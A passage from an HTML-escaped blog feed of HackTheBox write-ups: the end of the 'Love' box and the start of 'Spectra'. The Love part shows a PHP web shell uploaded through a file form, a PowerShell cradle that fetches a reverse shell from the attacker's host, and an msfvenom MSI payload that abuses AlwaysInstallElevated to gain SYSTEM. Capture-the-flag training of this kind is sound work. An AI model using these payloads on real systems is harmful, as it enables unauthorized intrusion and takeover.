+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://www.love.htb/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/05/19 13:48:49 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/includes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/admin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/.html.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/login.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/plugins &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+...[snip]...
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/05/19 13:53:09 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt; 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploiting-arbitrary-file-upload&quot;&gt;Exploiting Arbitrary File Upload&lt;/h3&gt;
+&lt;p&gt;By directly browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb/admin/candidates_add.php&lt;/code&gt; I discover that the script redirects me. Next, I will try to add a candidate by forcefully making a POST request. The new candidate form allows the uploading of a profile image, which provides opportunity for file upload attacks.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/admin/candidates_add.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;love.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;856&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=---------------------------276136513823541543352882203642&lt;/span&gt;
+
+-----------------------------276136513823541543352882203642
+Content-Disposition: form-data; name=&quot;firstname&quot;
+
+aa
+-----------------------------276136513823541543352882203642
+
+Content-Disposition: form-data; name=&quot;lastname&quot;
+
+aa
+-----------------------------276136513823541543352882203642
+Content-Disposition: form-data; name=&quot;position&quot;
+
+8
+-----------------------------276136513823541543352882203642
+Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;my-php-shell.php&quot;
+Content-Type: image/png
+
+&amp;lt;?php
+    echo system($_POST[&quot;cmd&quot;]);
+?&amp;gt;
+-----------------------------276136513823541543352882203642--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Uploading a web shell.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I use the following &lt;a href=&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1&quot;&gt;powershell&lt;/a&gt; one liner for my reverse shell. Next, I hit the uploaded shell with a powershell download cradle to download the reverse-shell that I host using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/images/my-php-shell.php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;love.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;122&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+
+cmd=powershell -exec bypass -c &quot;IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.207:8000/nishang.ps1')&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Triggering the reverse-shell.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;To catch the shell I run the following:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 9001
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The shell is running under the Phoebe user and can grab the user flag from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Phoebe\Desktop\user.txt&lt;/code&gt;. After grabbing the flag I setup a local SMB server using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-smbserver share /tmp&lt;/code&gt; to copy over the &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe&quot;&gt;winPEASx64 binary&lt;/a&gt; using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy \\10.10.14.207\share\winPEASx64.exe winpeas.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;Linpeas shows that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AlwaysInstallElevated&lt;/code&gt; key is set to 1. This means that installers will be run as Administrator without requiring credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/love/always-install-elevated-key.png&quot; alt=&quot;AlwaysInstallElevated key set&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So I generate a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.msi&lt;/code&gt; file that contains a reversehell back to me using msfvenom:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.207 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9002 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; msi &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; revshell.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, I copy over the reverse shell using my SMB server and catch the reverse shell and obtain a shell running as NT AUTHORITY/SYSTEM.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/love/system-shell.png&quot; alt=&quot;system-shell&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">Scanning &amp;amp; Enumeration I started with a basic nmap scan. I continue with some simple enumeration of each port: Port 445: Null sessions are not allowed, tested with: 1. nmap --script &quot;safe or smb-enum-*&quot; -p 445 10.10.10.239 2. rpcclient -U '' -N 10.10.10.239 Port 3306: I am not allowed to connect from my IP Address (script output). I will revisit this when I find SSRF on the web application. Ports 5000, 5985,47001: HTTP 403 FORBIDDEN (script output)</summary></entry><entry><title type="html">Spectra Write-Up</title><link href="/htb/spectra" rel="alternate" type="text/html" title="Spectra Write-Up" /><published>2021-04-24T23:20:00+02:00</published><updated>2021-04-24T23:20:00+02:00</updated><id>/htb/spectra</id><content type="html" xml:base="/htb/spectra">&lt;h2 id=&quot;scanning--enumeration&quot;&gt;Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;I started with an nmap scan, which showed a few open port. It seems&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-04-24 09:58 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.229
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.025s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 996 closed ports
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http             nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesnt have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+3306/tcp open  mysql            MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssl-cert: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssl-date: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_sslv2: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_tls-alpn: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_tls-nextprotoneg: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+8081/tcp open  blackice-icecap?
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 24 Apr 2021 14:09:19 GMT
+|     Connection: close
+|     Hello World
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 24 Apr 2021 14:09:24 GMT
+|     Connection: close
+|_    Hello World
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8081-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.91%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4/24%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;608423F9%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ge
+SF:tRequest,71,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/plain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D
+SF:ate:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Sat,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Apr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2014:09:19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20
+SF:close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FourOhFourRequest,71,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2020
+SF:0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/plain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Sat,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Apr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2
+SF:02021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2014:09:19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connection:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+SF:n&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HTTPOptions,71,&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20200&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-Type:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20text/p
+SF:lain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Date:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Sat,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2024&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Apr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202021&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2014:09:24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20GMT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Connec
+SF:tion:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By checking port 3306 manually I find that I am not allowed to access it from my current IP. Lets revisit this if I can find a ssrf vulnerability or gained foothold on the machine.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 10.10.10.229 3306
+
+Host &lt;span class=&quot;s1&quot;&gt;'10.10.14.104'&lt;/span&gt; is not allowed to connect to this MySQL server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumerating-the-web-application&quot;&gt;Enumerating the Web Application&lt;/h2&gt;
+&lt;p&gt;I first went to port 80 and was greeted with a very basic webpage. The webpage did contain links using the hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spectra.htb&lt;/code&gt;; so I added that to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/spectra/port-80.png&quot; alt=&quot;Homepage of port 80.&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The link to the test url results in an error page claiming there was a database error. No I found no other interesting information here.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumerating-wordpress&quot;&gt;Enumerating Wordpress&lt;/h3&gt;
+
+&lt;p&gt;The url &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://spectra.htb/main/&lt;/code&gt; links to a wordpress website. I tried logging in with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://spectra.htb/main/wp-login.php&lt;/code&gt; and got an error message that the username is unknown. I may thus leverage this to enumerate users.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/spectra/wordpress-user-enum.png&quot; alt=&quot;wordpress login error&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Clicking on the comment field I discover that the wordpress version is 5.4.2&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;rss&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;version=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.0&quot;&lt;/span&gt;
+	&lt;span class=&quot;na&quot;&gt;xmlns:content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://purl.org/rss/1.0/modules/content/&quot;&lt;/span&gt;
+	&lt;span class=&quot;na&quot;&gt;xmlns:dc=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://purl.org/dc/elements/1.1/&quot;&lt;/span&gt;
+	&lt;span class=&quot;na&quot;&gt;xmlns:atom=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2005/Atom&quot;&lt;/span&gt;
+	&lt;span class=&quot;na&quot;&gt;xmlns:sy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://purl.org/rss/1.0/modules/syndication/&quot;&lt;/span&gt;
+	
+	&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;channel&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;
+	Comments for Software Issue Management	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;atom:link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://spectra.htb/main/?feed=comments-rss2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;self&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/rss+xml&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
